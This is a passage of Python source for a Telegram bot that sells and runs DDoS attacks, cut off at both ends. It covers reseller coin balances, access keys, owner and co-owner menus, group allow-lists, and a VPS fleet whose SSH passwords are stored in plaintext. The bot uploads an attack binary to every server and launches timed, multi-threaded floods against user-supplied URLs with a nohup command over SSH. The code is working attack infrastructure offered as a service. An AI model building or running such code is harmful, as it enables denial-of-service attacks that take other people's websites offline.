            "❌ Invalid input. Please enter a positive integer for amount.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    except KeyError:
        await update.message.reply_text(
            "❌ User ID not found in context. Please restart the process.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def show_balance(update: Update, context: CallbackContext):
    """Shows the user's coin balance."""
    user_id = update.effective_user.id
    balance = reseller_balances.get(str(user_id), 0) # Ensure key is string
    await update.message.reply_text(
        f"💰 Your current balance: *{balance}* coins.",
        parse_mode='Markdown'
    )

async def open_bot(update: Update, context: CallbackContext):
    """Opens the bot for attacks."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can open/close the bot.", parse_mode='Markdown')
        return
    global bot_open
    bot_open = True
    await update.message.reply_text("✅ Bot is now *open* for attacks!", parse_mode='Markdown')
    logging.info(f"Owner {update.effective_user.id} opened the bot.")

async def close_bot(update: Update, context: CallbackContext):
    """Closes the bot for attacks."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can open/close the bot.", parse_mode='Markdown')
        return
    global bot_open
    bot_open = False
    await update.message.reply_text("✅ Bot is now *closed* for attacks!", parse_mode='Markdown')
    logging.info(f"Owner {update.effective_user.id} closed the bot.")

async def menu_selection(update: Update, context: CallbackContext):
    """Shows the owner/co-owner menu."""
    if is_owner(update):
        await update.message.reply_text(
            "⚙️ *Owner Menu*\n\n"
            "Select an administrative option:",
            parse_mode='Markdown',
            reply_markup=owner_menu_markup
        )
    elif is_co_owner(update):
        await update.message.reply_text(
            "⚙️ *Co-Owner Menu*\n\n"
            "Select an administrative option:",
            parse_mode='Markdown',
            reply_markup=co_owner_menu_markup
        )
    else:
        await update.message.reply_text("❌ You are not authorized to access this menu.", parse_mode='Markdown')

async def add_group_id_prompt(update: Update, context: CallbackContext):
    """Prompts for a group ID to add."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can manage group IDs.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ Enter the Group ID to allow the bot in (e.g., `-1001234567890`):")
    return ADD_GROUP_ID

async def add_group_id(update: Update, context: CallbackContext):
    """Adds a group ID to allowed list."""
    try:
        group_id_to_add = int(update.message.text.strip())
        if group_id_to_add in ALLOWED_GROUP_IDS:
            await update.message.reply_text("❌ This group ID is already allowed.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        else:
            ALLOWED_GROUP_IDS.append(group_id_to_add)
            # Optionally save ALLOWED_GROUP_IDS to a file if needed
            await update.message.reply_text(
                f"✅ Group ID `{group_id_to_add}` added to allowed list.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            logging.info(f"User {update.effective_user.id} added group ID: {group_id_to_add}")
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a valid integer Group ID.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def remove_group_id_prompt(update: Update, context: CallbackContext):
    """Prompts for a group ID to remove."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can manage group IDs.", parse_mode='Markdown')
        return ConversationHandler.END

    if not ALLOWED_GROUP_IDS:
        await update.message.reply_text("ℹ️ No group IDs currently allowed.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    group_list_str = "\n".join([f"• `{gid}`" for gid in ALLOWED_GROUP_IDS])
    await update.message.reply_text(
        f"⚠️ Current Allowed Group IDs:\n{group_list_str}\n\nEnter the Group ID to remove:",
        parse_mode='Markdown'
    )
    return REMOVE_GROUP_ID

async def remove_group_id(update: Update, context: CallbackContext):
    """Removes a group ID from allowed list."""
    try:
        group_id_to_remove = int(update.message.text.strip())
        if group_id_to_remove in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.remove(group_id_to_remove)
            # Optionally save ALLOWED_GROUP_IDS to a file if needed
            await update.message.reply_text(
                f"✅ Group ID `{group_id_to_remove}` removed from allowed list.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            logging.info(f"User {update.effective_user.id} removed group ID: {group_id_to_remove}")
        else:
            await update.message.reply_text("❌ This group ID is not in the allowed list.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a valid integer Group ID.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def show_reseller_status(update: Update, context: CallbackContext):
    """Shows reseller details and their balances."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can view reseller status.", parse_mode='Markdown')
        return

    if not resellers:
        await update.message.reply_text("ℹ️ No resellers currently configured.", parse_mode='Markdown')
        return

    message_parts = ["💰 *Reseller Status:*"]
    for reseller_id in resellers:
        balance = reseller_balances.get(str(reseller_id), 0) # Ensure key is string
        try:
            reseller_chat = await context.bot.get_chat(reseller_id)
            username = f"@{reseller_chat.username}" if reseller_chat.username else "N/A"
            full_name = escape_markdown(reseller_chat.full_name, version=2)
            message_parts.append(f"\nUser: {full_name} ({username})\nID: `{reseller_id}`\nBalance: *{balance}* coins")
        except Exception as e:
            logging.error(f"Could not fetch chat info for reseller {reseller_id}: {e}")
            message_parts.append(f"\nUser ID: `{reseller_id}` (Details unavailable)\nBalance: *{balance}* coins")

    await update.message.reply_text("\n".join(message_parts), parse_mode='MarkdownV2')

async def show_vps_status(update: Update, context: CallbackContext):
    """Shows VPS connection details and binary status."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can view VPS status.", parse_mode='Markdown')
        return

    if not VPS_LIST:
        await update.message.reply_text("ℹ️ No VPS servers configured. Please add some first.", parse_mode='Markdown')
        return

    message_parts = ["🌐 *VPS Status:*"]
    for i, (ip, user, _) in enumerate(VPS_LIST):
        status = "Unknown"
        binary_exists = "Unknown"
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(hostname=ip, username=user, timeout=5)
            status = "✅ Connected"

            # Check if binary exists
            stdin, stdout, stderr = client.exec_command(f"test -f {BINARY_PATH} && echo 'exists' || echo 'missing'")
            output = stdout.read().decode().strip()
            binary_exists = "✅ Exists" if output == 'exists' else "❌ Missing"

            client.close()
        except paramiko.AuthenticationException:
            status = "❌ Auth Failed"
        except paramiko.SSHException as e:
            status = f"❌ SSH Error: {e}"
        except Exception as e:
            status = f"❌ Error: {e}"

        message_parts.append(f"\n*{i+1}.* IP: `{ip}`\nUser: `{user}`\nStatus: *{status}*\nBinary: *{binary_exists}*")

    await update.message.reply_text("\n".join(message_parts), parse_mode='Markdown')

async def add_vps_prompt(update: Update, context: CallbackContext):
    """Prompts for new VPS details."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ Only owner or co-owners can add VPS.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ Enter VPS details (IP,Username,Password):")
    return GET_VPS_INFO

async def add_vps(update: Update, context: CallbackContext):
    """Adds a new VPS entry."""
    vps_info = update.message.text.strip().split(',')
    if len(vps_info) == 3:
        ip, user, password = [s.strip() for s in vps_info]
        if not re.match(r"^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}$", ip):
            await update.message.reply_text("❌ Invalid IP address format. Please use `X.X.X.X`.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            return ConversationHandler.END

        # Check for duplicates
        for existing_ip, _, _ in VPS_LIST:
            if existing_ip == ip:
                await update.message.reply_text("❌ This VPS IP already exists.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
                return ConversationHandler.END

        VPS_LIST.append([ip, user, password])
        with open(VPS_FILE, 'a') as f:
            f.write(f"{ip},{user},{password}\n")
        await update.message.reply_text(
            f"✅ VPS `{ip}` added successfully.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        logging.info(f"User {update.effective_user.id} added VPS: {ip}")
    else:
        await update.message.reply_text(
            "❌ Invalid format. Please use `IP,Username,Password`.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def remove_vps_prompt(update: Update, context: CallbackContext):
    """Prompts for VPS IP to remove."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can remove VPS.", parse_mode='Markdown')
        return ConversationHandler.END

    if not VPS_LIST:
        await update.message.reply_text("ℹ️ No VPS servers configured to remove.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    vps_list_str = "\n".join([f"• `{i+1}. {ip}`" for i, (ip, _, _) in enumerate(VPS_LIST)])
    await update.message.reply_text(
        f"⚠️ Current VPS List:\n{vps_list_str}\n\nEnter the number of the VPS to remove (e.g., `1` for the first VPS):",
        parse_mode='Markdown'
    )
    return GET_VPS_TO_REMOVE

async def remove_vps(update: Update, context: CallbackContext):
    """Removes a specified VPS entry."""
    try:
        idx_to_remove = int(update.message.text.strip()) - 1 # Convert to 0-based index
        if 0 <= idx_to_remove < len(VPS_LIST):
            removed_vps = VPS_LIST.pop(idx_to_remove)
            with open(VPS_FILE, 'w') as f: # Rewrite the whole file
                for ip, user, password in VPS_LIST:
                    f.write(f"{ip},{user},{password}\n")
            await update.message.reply_text(
                f"✅ VPS `{removed_vps[0]}` removed successfully.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            logging.info(f"Owner {update.effective_user.id} removed VPS: {removed_vps[0]}")
        else:
            await update.message.reply_text("❌ Invalid VPS number.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a valid number from the list.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def upload_binary_prompt(update: Update, context: CallbackContext):
    """Prompts for binary file upload."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can upload binaries.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text(
        f"⬆️ Send the `{BINARY_NAME}` binary file to upload to all VPS servers.\n"
        "This will replace the existing binary at `{BINARY_PATH}`.\n\n"
        "Type 'cancel' to abort.",
        parse_mode='Markdown'
    )
    return CONFIRM_BINARY_UPLOAD # This state will handle the document/file

async def upload_binary_handler(update: Update, context: CallbackContext):
    """Handles the uploaded binary file."""
    if not is_owner(update):
        return

    if update.message.text and update.message.text.lower() == 'cancel':
        await update.message.reply_text("❌ Binary upload cancelled.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    if not update.message.document:
        await update.message.reply_text("❌ Please send a file as a document.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    if not VPS_LIST:
        await update.message.reply_text("❌ No VPS configured to upload binary to.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    document = update.message.document
    if document.file_name != BINARY_NAME:
        await update.message.reply_text(f"⚠️ Warning: The file name is not `{BINARY_NAME}`. Please ensure you're uploading the correct binary. Proceeding anyway.", parse_mode='Markdown')

    file_id = document.file_id
    file_path = await context.bot.get_file(file_id)
    download_path = f"./{document.file_name}"

    try:
        await file_path.download_to_drive(download_path)
        await update.message.reply_text(f"✅ Binary file `{document.file_name}` downloaded to bot server. Starting upload to VPS...", parse_mode='Markdown')
        
        success_count = 0
        failed_ips = []

        for ip, user, password in VPS_LIST:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=ip, username=user, password=password, timeout=10)

                # Ensure the target directory exists
                target_dir = os.path.dirname(BINARY_PATH)
                stdin, stdout, stderr = client.exec_command(f"mkdir -p {target_dir}")
                stdout.read()
                stderr.read()

                with SCPClient(client.get_transport()) as scp:
                    scp.put(download_path, remote_path=BINARY_PATH)

                # Make executable
                stdin, stdout, stderr = client.exec_command(f"chmod +x {BINARY_PATH}")
                stdout.read()
                stderr.read()

                client.close()
                success_count += 1
                logging.info(f"Uploaded and set executable {BINARY_NAME} on {ip}")
            except Exception as e:
                failed_ips.append(ip)
                logging.error(f"Failed to upload binary to {ip}: {e}")

        os.remove(download_path) # Clean up local file

        if success_count > 0:
            status_msg = f"✅ Successfully uploaded `{BINARY_NAME}` to *{success_count}* VPS servers."
            if failed_ips:
                status_msg += f"\n\n❌ Failed to upload to: `{', '.join(failed_ips)}`"
            await update.message.reply_text(status_msg, parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        else:
            await update.message.reply_text(
                f"❌ Failed to upload `{BINARY_NAME}` to any VPS. Check logs for details.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )

    except Exception as e:
        logging.error(f"Error during binary upload process: {e}")
        await update.message.reply_text(
            f"❌ An error occurred during binary upload: {e}",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def delete_binary_prompt(update: Update, context: CallbackContext):
    """Prompts for binary deletion confirmation."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can delete binaries.", parse_mode='Markdown')
        return ConversationHandler.END

    if not VPS_LIST:
        await update.message.reply_text("ℹ️ No VPS configured to delete binary from.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    keyboard = InlineKeyboardMarkup([
        [InlineKeyboardButton("Yes, Delete All", callback_data="delete_binary_confirm")],
        [InlineKeyboardButton("Cancel", callback_data="delete_binary_cancel")]
    ])
    await update.message.reply_text(
        f"⚠️ Are you sure you want to delete the `{BINARY_NAME}` binary from ALL VPS servers at `{BINARY_PATH}`?",
        reply_markup=keyboard,
        parse_mode='Markdown'
    )
    return CONFIRM_BINARY_DELETE

async def delete_binary_handler(update: Update, context: CallbackContext):
    """Handles binary deletion confirmation."""
    query = update.callback_query
    await query.answer()

    if query.data == "delete_binary_cancel":
        await query.edit_message_text("🚫 Binary deletion cancelled.", reply_markup=None)
        await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    if query.data == "delete_binary_confirm":
        success_count = 0
        failed_ips = []

        for ip, user, password in VPS_LIST:
            try:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(hostname=ip, username=user, password=password, timeout=10)
                
                # Kill any running processes of the binary first
                stdin, stdout, stderr = client.exec_command(f"pkill -f {BINARY_NAME}")
                stdout.read()
                stderr.read()

                # Delete the binary file
                stdin, stdout, stderr = client.exec_command(f"rm {BINARY_PATH}")
                stdout.read()
                stderr.read()
                client.close()
                success_count += 1
                logging.info(f"Deleted {BINARY_NAME} from {ip}")
            except Exception as e:
                failed_ips.append(ip)
                logging.error(f"Failed to delete binary from {ip}: {e}")

        if success_count > 0:
            status_msg = f"✅ Successfully deleted `{BINARY_NAME}` from *{success_count}* VPS servers."
            if failed_ips:
                status_msg += f"\n\n❌ Failed to delete from: `{', '.join(failed_ips)}`"
            await query.edit_message_text(status_msg, parse_mode='Markdown', reply_markup=None)
            await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
        else:
            await query.edit_message_text(
                f"❌ Failed to delete `{BINARY_NAME}` from any VPS. Check logs for details.",
                parse_mode='Markdown', reply_markup=None
            )
            await query.message.reply_markup(reply_markup=get_appropriate_markup(update))
    return ConversationHandler.END

async def add_co_owner_prompt(update: Update, context: CallbackContext):
    """Prompts for co-owner user ID."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can add co-owners.", parse_mode='Markdown')
        return ConversationHandler.END

    await update.message.reply_text("⚠️ Enter the user ID of the co-owner to add:")
    return GET_ADD_CO_OWNER_ID

async def add_co_owner(update: Update, context: CallbackContext):
    """Adds a co-owner."""
    try:
        co_owner_id = int(update.message.text.strip())
        if co_owner_id in COOWNER_IDS:
            await update.message.reply_text("❌ This user is already a co-owner.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        else:
            COOWNER_IDS.append(co_owner_id)
            # You might want to save COOWNER_IDS to a config file here
            await update.message.reply_text(
                f"✅ User ID `{co_owner_id}` added as a co-owner.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            logging.info(f"Owner {update.effective_user.id} added co-owner: {co_owner_id}")
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a valid user ID (number).",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def remove_co_owner_prompt(update: Update, context: CallbackContext):
    """Prompts for co-owner user ID to remove."""
    if not is_owner(update):
        await update.message.reply_text("❌ Only the owner can remove co-owners.", parse_mode='Markdown')
        return ConversationHandler.END

    if not COOWNER_IDS:
        await update.message.reply_text("ℹ️ No co-owners currently configured.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    co_owner_list_str = "\n".join([f"• `{coid}`" for coid in COOWNER_IDS])
    await update.message.reply_text(
        f"⚠️ Current Co-Owners:\n{co_owner_list_str}\n\nEnter the user ID of the co-owner to remove:",
        parse_mode='Markdown'
    )
    return GET_REMOVE_CO_OWNER_ID

async def remove_co_owner(update: Update, context: CallbackContext):
    """Removes a co-owner."""
    try:
        co_owner_id = int(update.message.text.strip())
        if co_owner_id in COOWNER_IDS:
            COOWNER_IDS.remove(co_owner_id)
            # You might want to save COOWNER_IDS to a config file here
            await update.message.reply_text(
                f"✅ User ID `{co_owner_id}` removed from co-owners.",
                parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
            )
            logging.info(f"Owner {update.effective_user.id} removed co-owner: {co_owner_id}")
        else:
            await update.message.reply_text("❌ This user is not a co-owner.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a valid user ID (number).",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
    return ConversationHandler.END

async def get_attack_args(update: Update, context: CallbackContext):
    """Receives attack arguments (target, duration, threads) and initiates attack."""
    user_id = update.effective_user.id
    
    args = update.message.text.strip().split()
    if len(args) < 2:
        await update.message.reply_text(
            "❌ Invalid format. Please enter target URL and duration (e.g., `https://example.com 60`).",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return ConversationHandler.END
    
    target = args[0]
    
    # Validate URL format (basic check)
    if not (target.startswith("http://") or target.startswith("https://")):
        await update.message.reply_text("❌ Invalid target. URL must start with `http://` or `https://`.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    try:
        duration = int(args[1])
        if duration <= 0:
            raise ValueError
    except ValueError:
        await update.message.reply_text("❌ Invalid duration. Please enter a positive integer.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    threads = DEFAULT_THREADS # Default threads
    if len(args) >= 3:
        try:
            threads = int(args[2])
            if threads <= 0:
                raise ValueError
        except ValueError:
            await update.message.reply_text("⚠️ Invalid threads count. Using default threads: {DEFAULT_THREADS}.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
            threads = DEFAULT_THREADS

    # Get key type and max limits
    is_special_key_user = False
    if user_id in redeemed_users:
        redeem_data = redeemed_users[user_id]
        is_special_key_user = isinstance(redeem_data, dict) and redeem_data.get('is_special', False)

    allowed_max_duration = SPECIAL_MAX_DURATION if is_special_key_user else max_duration
    allowed_max_threads = SPECIAL_MAX_THREADS if is_special_key_user else MAX_THREADS

    if duration > allowed_max_duration:
        await update.message.reply_text(
            f"❌ Duration exceeds limit. Max allowed duration for you is *{allowed_max_duration}* seconds.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return ConversationHandler.END

    if threads > allowed_max_threads:
        await update.message.reply_text(
            f"❌ Threads count exceeds limit. Max allowed threads for you is *{allowed_max_threads}*.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return ConversationHandler.END

    # Check cooldown
    global last_attack_time
    time_since_last_attack = time.time() - last_attack_time
    if time_since_last_attack < global_cooldown and not (is_owner(update) or is_co_owner(update)):
        remaining_cooldown = int(global_cooldown - time_since_last_attack)
        await update.message.reply_text(
            f"⏳ Cooldown in effect. Please wait *{remaining_cooldown}* seconds before another attack.",
            parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
        )
        return ConversationHandler.END

    # Get user's preferred VPS count, default to ACTIVE_VPS_COUNT if not set
    vps_to_use_count = USER_VPS_PREFERENCES.get(user_id, ACTIVE_VPS_COUNT)
    # Ensure user cannot request more VPS than available
    if vps_to_use_count > len(VPS_LIST):
        vps_to_use_count = len(VPS_LIST)
        await update.message.reply_text(f"⚠️ You requested {vps_to_use_count} VPS, but only {len(VPS_LIST)} are available. Using {len(VPS_LIST)} VPS.", parse_mode='Markdown')

    # Select available VPS
    available_vps = [vps for vps in VPS_LIST if vps[0] not in [a['vps_info'][0][0] for a in running_attacks.values()]] # Simple check, assumes one attack per VPS
    
    if not available_vps:
        await update.message.reply_text("❌ No VPS available to perform the attack. All are currently busy or offline.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    # Select the number of VPS to use
    selected_vps_for_attack = random.sample(available_vps, min(vps_to_use_count, len(available_vps)))

    if not selected_vps_for_attack:
        await update.message.reply_text("❌ No VPS available to perform the attack after selection. All are currently busy or offline.", parse_mode='Markdown', reply_markup=get_appropriate_markup(update))
        return ConversationHandler.END

    attack_id = f"{user_id}_{int(time.time())}"
    running_attacks[attack_id] = {
        'target': target,
        'duration': duration,
        'threads': threads,
        'user_id': user_id,
        'vps_info': selected_vps_for_attack,
        'start_time': time.time(),
        'status': 'Launching'
    }

    last_attack_time = time.time() # Update global cooldown time

    await update.message.reply_text(
        f"🚀 Initiating attack on *{target}* for *{duration}* seconds with *{threads}* threads using *{len(selected_vps_for_attack)}* VPS.",
        parse_mode='Markdown', reply_markup=get_appropriate_markup(update)
    )
    logging.info(f"Attack initiated: User {user_id}, Target: {target}, Duration: {duration}, Threads: {threads}, VPS Count: {len(selected_vps_for_attack)}")

    # Execute attack on each selected VPS concurrently
    for vps_ip, vps_user, vps_pass in selected_vps_for_attack:
        context.job_queue.run_once(
            lambda ctx: asyncio.create_task(execute_attack_on_vps(
                ctx.job.data['vps_ip'], ctx.job.data['vps_user'], ctx.job.data['vps_pass'],
                ctx.job.data['target'], ctx.job.data['duration'], ctx.job.data['threads'],
                ctx.job.data['user_id'], ctx.job.data['attack_id']
            )),
            when=0, # Run immediately
            data={
                'vps_ip': vps_ip,
                'vps_user': vps_user,
                'vps_pass': vps_pass,
                'target': target,
                'duration': duration,
                'threads': threads,
                'user_id': user_id,
                'attack_id': attack_id
            }
        )
    return ConversationHandler.END

async def execute_attack_on_vps(ip, user, password, target, duration, threads, user_id, attack_id):
    """Executes the DDoS attack command on a single VPS."""
    logging.info(f"Connecting to VPS {ip} for attack {attack_id}...")
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        client.connect(hostname=ip, username=user, password=password, timeout=10)

        # Check if binary exists
        stdin, stdout, stderr = client.exec_command(f"test -f {BINARY_PATH} && echo 'exists' || echo 'missing'")
        output = stdout.read().decode().strip()
        if output == 'missing':
            logging.error(f"Binary {BINARY_PATH} missing on VPS {ip}. Cannot execute attack.")
            client.close()
            # Mark this VPS as failed for this attack, or retry logic
            return

        command = f"nohup {BINARY_PATH} {target} {duration} {threads} > /dev/null 2>&1 &"
        stdin, stdout, stderr = client.exec_command(command)
        
        # Read from stdout/stderr to prevent hanging if the buffer fills up
        stdout.read()
        stderr.read()

        client.close()
        logging.info(f"Attack command sent to {ip} for target {target}")

        # Schedule attack end
        async def end_attack_job(context: CallbackContext):
            logging.info(f"Attempting to stop attack {attack_id} on {ip} after {duration} seconds.")
            if attack_id in running_attacks and (ip, user, password) in running_attacks[attack_id]['vps_info']:
                # Attempt to stop the process cleanly
                try:
                    client = paramiko.SSHClient()
                    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                    client.connect(hostname=ip, username=user, password=password, timeout=5)
                    stop_command = f"pkill -f '{BINARY_NAME} {target}'" # Kill specific attack process
                    stdin, stdout, stderr = client.exec_command(stop_command)
                    stdout.read()
                    stderr.read()
                    client.close()
                    logging.info(f"Attack stopped on {ip} for {target}")
                except Exception as e:
                    logging.error(f"Failed to stop attack on {ip} for {target}: {e}")
                
                # Remove this VPS from the attack's tracking list
                if attack_id in running_attacks:
                    running_attacks[attack_id]['vps_info'].remove((ip, user, password))
                    if not running_attacks[attack_id]['vps_info']: # If all VPS for this attack have finished
                        del running_attacks[attack_id]
                        logging.info(f"Attack {attack_id} fully finished and removed from tracking.")
                        try:
                            # Notify user that attack is finished if they are still active
                            await context.bot.send_message(
                                chat_id=user_id,
                                text=f"✅ Attack on *{target}* finished after *{duration}* seconds.",
                                parse_mode='Markdown'
                            )
                        except Exception as e:
                            logging.warning(f"Could not notify user {user_id} about finished attack: {e}")

        context.job_queue.run_once(end_attack_job, duration)

    except paramiko.AuthenticationException:
        logging.error(f"Authentication failed for VPS {ip} (User: {user})")
        # Notify user (if possible) or owner
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"❌ Failed to connect to a VPS to launch attack. Authentication failed for `{ip}`.",
                parse_mode='Markdown'
            )
        except Exception: pass # Ignore if cannot send message
    except paramiko.SSHException as e:
        logging.error(f"SSH error connecting to VPS {ip}: {e}")
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"❌ Failed to connect to a VPS to launch attack. SSH error for `{ip}`: {e}",
                parse_mode='Markdown'
            )
        except Exception: pass
    except Exception as e:
        logging.error(f"An unexpected error occurred during attack on {ip}: {e}")
        try:
            await context.bot.send_message(
                chat_id=user_id,
                text=f"❌ An unexpected error occurred while launching attack on `{ip}`: {e}",
                parse_mode='Markdown'
            )
        except Exception: pass
    finally:
        # If attack initiation failed, remove from running_attacks immediately
        if attack_id in running_attacks and (ip, user, password) in running_attacks[attack_id]['vps_info']:
             if running_attacks[attack_id]['status'] == 'Launching': # Only remove if still in launching state
                running_attacks[attack_id]['vps_info'].remove((ip, user, password))
                if not running_attacks[attack_id]['vps_info']:
                    del running_attacks[attack_id]
                    logging.info(f"Attack {attack_id} failed to launch on all VPS and removed from tracking.")
                else:
                    logging.warning(f"Attack {attack_id} failed to launch on {ip}, but other VPS might be launching.")


async def show_running_attacks(update: Update, context: CallbackContext):
    """Displays currently running attacks."""
    if not (is_owner(update) or is_co_owner(update)):
        await update.message.reply_text("❌ You are not authorized to view running attacks.", parse_mode='Markdown')
        return

    if not running_attacks:
        await update.message.reply_text("ℹ️ No attacks are currently running.", parse_mode='Markdown')
        return

    message_parts = ["🔥 *Running Attacks:*\n"]
    for attack_id, attack_info in running_attacks.items():
        target = attack_info['target']
        duration = attack_info['duration']
        threads = attack_info['threads']
        user_id = attack_info['user_id']
        vps_count = len(attack_info['vps_info'])
        start_time = attack_info['start_time']
        
        elapsed_time = int(time.time() - start_time)
        remaining_time = max(0, duration - elapsed_time)
        
        message_parts.append(
            f"• Target: `{target}`\n"
            f"  Duration: {duration}s (Remaining: {remaining_time}s)\n"
            f"  Threads: {threads}\n"
            f"  VPS Count: {vps_count}\n"
            f"  User ID: `{user_id}`\n"
        )
    
    await update.message.reply_text("\n".join(message_parts), parse_mode='Markdown')

async def track_new_chat(update: Update, context: CallbackContext):
    """Tracks new users and groups for broadcast purposes."""
    chat_id = update.effective_chat.id
    if update.effective_chat.type == 'private':
        if 'users_interacted' not in context.bot_data:
            context.bot_data['users_interacted'] = []
        if chat_id not in context.bot_data['users_interacted']:
            context.bot_data['users_interacted'].append(chat_id)
            logging.info(f"Tracked new private chat: {chat_id}")
    elif update.effective_chat.type in ['group', 'supergroup']:
        if chat_id not in ALLOWED_GROUP_IDS:
            logging.info(f"Bot joined unauthorized group: {chat_id} - {update.effective_chat.title}. Leaving.")
            try:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text="❌ This group is not authorized to use this bot. Please contact the owner to get access.",
                    parse_mode='Markdown'
                )
                await asyncio.sleep(2) # Give time for message to send
                await context.bot.leave_chat(chat_id)
            except Exception as e:
                logging.error(f"Failed to leave unauthorized group {chat_id}: {e}")
        else:
            logging.info(f"Bot active in authorized group: {chat_id} - {update.effective_chat.title}")

async def track_left_chat(update: Update, context: CallbackContext):
    """Removes group ID if the bot leaves or is kicked."""
    if update.my_chat_member.old_chat_member.status == 'member' and \
       update.my_chat_member.new_chat_member.status in ['left', 'kicked']:
        chat_id = update.effective_chat.id
        if chat_id in ALLOWED_GROUP_IDS:
            ALLOWED_GROUP_IDS.remove(chat_id)
            logging.info(f"Bot left/kicked from authorized group: {chat_id}. Removed from ALLOWED_GROUP_IDS.")
            # Optionally save ALLOWED_GROUP_IDS to a file here


async def periodic_sync(context: CallbackContext):
    """Periodically saves important data."""
    logging.debug("Performing periodic data sync...")
    save_keys()
    save_resellers()
    save_links()
    save_display_name()
    save_image_config()
    # You might want to save ALLOWED_GROUP_IDS and COOWNER_IDS if they are dynamic and not saved elsewhere
    logging.debug("Periodic data sync complete.")


def main():
    """Starts the bot."""
    # Load data on startup
    load_keys()
    load_vps()
    load_resellers()
    load_links()
    load_display_name()
    load_image_config() # Load image config after defining START_IMAGES and GROUP_IMAGES


    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()

    # Conversation Handlers
    attack_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.Regex('^Attack$'), handle_button_click)],
        states={
            GET_ATTACK_ARGS: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_attack_args)],
        },
        fallbacks=[CommandHandler('cancel', lambda u, c: ConversationHandler.END)]
    )

    redeem_handler = ConversationHandler(
